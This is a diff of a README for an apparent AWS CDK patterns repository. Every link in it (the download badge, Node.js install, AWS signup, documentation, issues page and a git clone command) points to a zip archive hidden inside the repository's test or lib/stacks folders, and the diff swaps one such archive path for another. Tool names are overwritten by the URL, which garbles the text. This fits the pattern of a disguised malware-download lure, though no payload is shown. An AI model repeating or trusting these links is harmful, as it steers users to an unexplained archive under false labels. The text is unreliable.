@@ -1,6 +1,6 @@
 # 🎉 aws-cdk-patterns - Simplify Your AWS Infrastructure Setup
 
-[![Download aws-cdk-patterns](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip%20CDK%https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip)](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip)
+[![Download aws-cdk-patterns](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip%20CDK%https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip)](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip)
 
 ## 📜 Overview
 
@@ -12,13 +12,13 @@ To begin using the aws-cdk-patterns, follow these simple steps:
 
 1. **Visit the Releases Page**
    Click on the following link to access the download page for the aws-cdk-patterns repository:
-   [Download aws-cdk-patterns](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip)
+   [Download aws-cdk-patterns](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip)
 
 2. **Select and Download**
    You will see a list of available versions. Each version includes a description. Choose the version you want to download. Click on the corresponding asset link to start the download.
 
 3. **Install Prerequisites**
-   Ensure you have https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip and npm (Node Package Manager) installed on your system, as they are required to run TypeScript applications. You can download https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip from the [official https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip website](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip). This installation will also install npm automatically.
+   Ensure you have https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip and npm (Node Package Manager) installed on your system, as they are required to run TypeScript applications. You can download https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip from the [official https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip website](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip). This installation will also install npm automatically.
 
 4. **Install AWS CDK**
    Open your terminal or command prompt. Use the following command to install the AWS CDK globally on your system:
@@ -29,7 +29,7 @@ To begin using the aws-cdk-patterns, follow these simple steps:
 5. **Clone the Repository**
    If you want to explore the repository's code, you can clone it to your local machine. Use the following command in your terminal:
    ```bash
-   git clone https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip
+   git clone https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip
    ```
 
 6. **Navigate to Pattern Directory**
@@ -58,9 +58,9 @@ To begin using the aws-cdk-patterns, follow these simple steps:
 Before you begin, make sure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip Version 14 or higher
-- npm: Comes with https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip
-- AWS Account: Create a free account at [AWS](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip)
+- https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip Version 14 or higher
+- npm: Comes with https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip
+- AWS Account: Create a free account at [AWS](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip)
 
 ## 📦 Features
 
@@ -82,9 +82,9 @@ While using aws-cdk-patterns, you may encounter some common issues. Here’s how
 
 ## 📚 Resources
 
-- **AWS CDK Documentation**: Learn more about AWS CDK by visiting the [official documentation](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip).
+- **AWS CDK Documentation**: Learn more about AWS CDK by visiting the [official documentation](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip).
 - **AWS Training**: Consider enrolling in AWS training courses to build your cloud skills.
-- **GitHub Issues**: For technical issues related to this repository, visit the [issues section](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/test/stacks/aws-cdk-patterns-3.5.zip).
+- **GitHub Issues**: For technical issues related to this repository, visit the [issues section](https://raw.githubusercontent.com/spx-stack/aws-cdk-patterns/main/lib/stacks/cdk-aws-patterns-v2.0.zip).
 
 ## 💬 Community and Support
 
